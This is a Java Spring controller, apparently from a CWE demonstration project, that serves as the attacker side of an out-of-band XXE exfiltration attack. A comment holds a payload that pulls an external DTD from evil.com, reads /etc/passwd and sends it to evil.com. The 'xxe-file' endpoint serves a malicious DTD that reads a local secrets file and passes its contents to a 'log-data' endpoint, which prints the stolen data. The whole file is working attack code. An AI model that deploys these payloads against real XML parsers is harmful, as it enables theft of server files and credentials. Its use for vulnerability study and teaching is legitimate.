package com.example.cwe.evil;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.Console;

@RestController
@RequestMapping("evil")
public class EvilController {
    /**
     * <?xml version="1.0" encoding="UTF-8"?>
     * <!DOCTYPE foo [<!ENTITY% pe SYSTEM "http://evil.com/xxe_file"> %pe; %param1; ]>
     * <foo>&external;</foo>
     * <p>
     * <!--        Содержимое файла xxe_file:-->
     * <!--<!ENTITY% payload SYSTEM "file:///etc/passwd">-->
     * <!--<!ENTITY% param1 "<!ENTITY external SYSTEM 'http://evil.com/log_xxe?data=%payload;'>">-->
     */


    @GetMapping("xxe-file")
    public String payload() {
        return "<!ENTITY % payload SYSTEM \"file:///c:/temp/secrets.txt\">\n" +
                "<!ENTITY % param1 \"<!ENTITY external SYSTEM 'http://localhost:7171/evil/log-data?data=%payload;'>\">";
    }

    @GetMapping("log-data")
    public void logData(@RequestParam String data) {
        System.out.println("Data received: " + data);
    }
}
